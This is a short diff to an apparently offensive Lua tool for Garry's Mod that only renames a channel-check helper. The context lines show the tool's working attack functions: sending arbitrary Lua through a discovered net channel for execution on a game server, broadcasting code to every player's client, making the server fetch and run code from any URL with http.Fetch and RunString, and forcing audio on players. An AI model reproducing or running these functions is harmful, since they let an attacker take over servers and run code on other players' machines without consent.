@@ -31,7 +31,7 @@ local function isSnteChannel(str, tbl)
   return false
 end
 
-local function channelNil()
+local function channelNull()
   if channel == "" then
     MsgC(Color(166, 222, 255), "No channel has been set. Please scan for available channels.\n")
     return true
@@ -87,7 +87,7 @@ end
 
 
 local function luaRun(ply, cmd, args, argStr)
-if(!argStr || channelNil()) then return end
+if(!argStr || channelNull()) then return end
   net.Start(channel)
 	net.WriteString(argStr)
 	net.SendToServer()
@@ -191,7 +191,7 @@ local function ACGetPlayers( cmd, stringargs )
 end
 
 local function runFuncClient(ply, cmd, args, argStr)
-  if(!args[1] && !args[2] || channelNil()) then return end
+  if(!args[1] && !args[2] || channelNull()) then return end
     for k, v in pairs(player.GetAll()) do
       if(v:Nick() == args[1]) then
         local exec = "player.GetByID("..v:EntIndex().."):"..table.concat(args, nil, 2)
@@ -205,7 +205,7 @@ local function runFuncClient(ply, cmd, args, argStr)
 end
 
 local function broadcastFunc(ply, cmd, args, argStr)
-  if(!argStr || argStr == "" || channelNil()) then return end
+  if(!argStr || argStr == "" || channelNull()) then return end
     local exec = "BroadcastLua([["..string.char(string.byte(argStr, 1, string.len(argStr))).."]])"
     net.Start(channel)
     net.WriteString(exec)
@@ -214,7 +214,7 @@ local function broadcastFunc(ply, cmd, args, argStr)
 end
 
 local function fetchUrl(ply, cmd, args, argStr)
-  if(!argStr || argStr == "" || channelNil()) then return end
+  if(!argStr || argStr == "" || channelNull()) then return end
     local exec = "http.Fetch('http://"..argStr.."', RunString)"
     net.Start(channel)
     net.WriteString(exec)
@@ -223,7 +223,7 @@ local function fetchUrl(ply, cmd, args, argStr)
 end
 
 local function playUrl(ply, cmd, args, argStr)
-  if(!argStr || argStr == "" || channelNil()) then return end
+  if(!argStr || argStr == "" || channelNull()) then return end
     local exec = "BroadcastLua([[sound.PlayURL('http://"..argStr.."', 'mono', function() end)]])"
     net.Start(channel)
     net.WriteString(exec)
